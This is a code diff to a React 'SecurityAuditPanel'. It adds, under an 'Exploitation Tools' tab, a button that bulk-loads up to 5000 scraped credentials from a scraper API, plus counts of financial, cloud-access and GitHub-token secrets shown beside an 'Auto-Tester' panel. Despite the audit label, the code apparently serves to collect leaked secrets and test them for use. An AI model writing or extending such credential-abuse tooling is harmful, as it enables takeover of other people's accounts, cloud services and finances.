@@ -596,8 +596,46 @@ export default function SecurityAuditPanel() {
         {/* Exploit Tab */}
         {activeTab === 'exploit' && (
           <div className="bg-gray-800 rounded-2xl p-6 border border-yellow-500/30">
-            <h2 className="text-2xl font-bold text-yellow-400 mb-6">⚡ Exploitation Tools</h2>
+            <h2 className="text-2xl font-bold text-yellow-400 mb-4">⚡ Exploitation Tools</h2>
             
+            {/* Load All Database Credentials */}
+            <div className="bg-blue-900/30 border border-blue-500 rounded-lg p-4 mb-6">
+              <div className="flex items-center justify-between">
+                <div>
+                  <div className="text-white font-bold">📊 Database Credentials</div>
+                  <div className="text-gray-400 text-sm">Load all scanned credentials from database</div>
+                </div>
+                <button
+                  onClick={async () => {
+                    try {
+                      const response = await fetch(`${API_URL}/scraper/all-credentials?limit=5000`, {
+                        headers: { 'x-admin-key': adminKey }
+                      });
+                      const data = await response.json();
+                      if (data.success) {
+                        setResults(data.credentials);
+                        alert(`Loaded ${data.credentials.length} credentials from database!`);
+                      }
+                    } catch (error) {
+                      alert('Failed to load: ' + error.message);
+                    }
+                  }}
+                  className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-semibold transition"
+                >
+                  Load All ({stats?.totalCredentials || 0})
+                </button>
+              </div>
+            </div>
+            
+            <div className="bg-gray-900 rounded-lg p-4 mb-4 border border-gray-700">
+              <div className="text-white font-semibold mb-2">Current Loaded: {results.length} credentials</div>
+              <div className="text-sm text-gray-400">
+                Financial: {results.filter(r => r.category === 'financial').length} | 
+                Cloud: {results.filter(r => r.category === 'cloud_access').length} | 
+                GitHub: {results.filter(r => r.credential_type === 'github_token').length}
+              </div>
+            </div>
+
             <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
               {/* Auto-Tester */}
               <div className="bg-gradient-to-br from-blue-900/30 to-blue-800/30 border border-blue-500 rounded-xl p-6">
